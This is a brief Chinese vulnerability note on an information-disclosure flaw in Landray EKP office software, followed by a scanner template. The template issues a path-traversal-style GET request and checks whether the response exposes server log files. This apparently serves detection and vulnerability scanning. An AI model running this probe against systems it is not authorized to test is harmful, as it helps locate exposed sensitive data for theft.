漏洞描述：蓝凌EKP由深圳市蓝凌软件股份有限公司自出研发，是一款全程在线数字化OA，应用于大中型企业在线化办公。包含流程管理、知识管理、会议管理、公文管理、任务管理及督办管理等100个功能模块。。攻击者可利 用漏洞获取大量敏感信息。

```
relative: req0
session: false
requests:
- method: GET
timeout: 10
path: /./ui-ext/./behavior/
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
follow_redirects: false
matches: (code.eq("200") && body.contains("ekp_server.log"))
```

